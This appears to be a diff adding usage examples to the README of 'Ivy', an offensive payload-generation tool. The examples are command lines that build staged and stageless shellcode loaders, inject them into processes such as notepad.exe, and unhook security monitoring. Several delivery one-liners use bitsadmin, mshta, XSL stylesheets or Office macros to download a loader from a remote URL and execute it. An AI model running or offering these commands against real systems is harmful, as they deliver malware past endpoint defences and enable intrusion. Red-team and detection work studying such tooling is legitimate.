@@ -166,5 +166,77 @@ The delivery command line argument allows you to generate a command or string of
 * Macro – This will generate an Office macro that can be put into an Excel or Word macro document. When this macro is executed, the loader will be downloaded from a remote source and executed, then removed. 
 * XSL - Generates a xsl stylesheet file containing the loader along with a one liner command execute the loader remotely.
 
+# Examples 
+
+### Staged Inject payload
+
+
+```
+./Ivy -Ix64 test64.vba -Ix86 test32.vba -P Inject -O SampleInject.js
+```
+
+### Staged Local payload
+```
+./Ivy -Ix64 test64.c -Ix86 test32.c -P Local -O SampleLocal.js
+```
+
+### Stagless Local payload
+```
+./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O stageless.js
+```
+
+### Stagless Injected payload
+```
+./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O stageless.js
+```
+
+### Stagless Injected payload spawning notepad.exe
+```
+./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -process64 C:\\windows\\system32\\notepad.exe -process32 C:\\windows\\SysWOW64\\notepad.exe -O stageless.js
+```
+
+### Unhooked Stagless Local payload 
+```
+./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -unhook -O stageless.js
+```
+
+### Unhooked Stagless Injected payload
+```
+./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -unhook -O stageless.js
+```
+
+## One Liner Commands Samples
+
+### Non-Executable File Types
+
+```
+./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O test.png -stageless
+```
+
+### Bitsadmin Command
+
+```
+./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.js -url http://ACME.com -delivery bits -stageless
+```
+
+### MSHTA.exe Command
+
+```
+./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.hta -url http://ACME.com -delivery hta -stageless
+```
+
+
+### Stylesheet Payload
+```
+./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.xsl -url http://ACME.com -delivery xsl -stageless
+```
+
+
+### Macro Web Downloader
+
+```
+./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.txt -url http://ACME.com/test.txt -delivery macro -stageless
+```
+
 # Known Issues
 Currently there is a known issue with unhooking the remote injected process. A current work around is to load the [unhook](https://github.com/rsmudge/unhook-bof) BOF, for now.
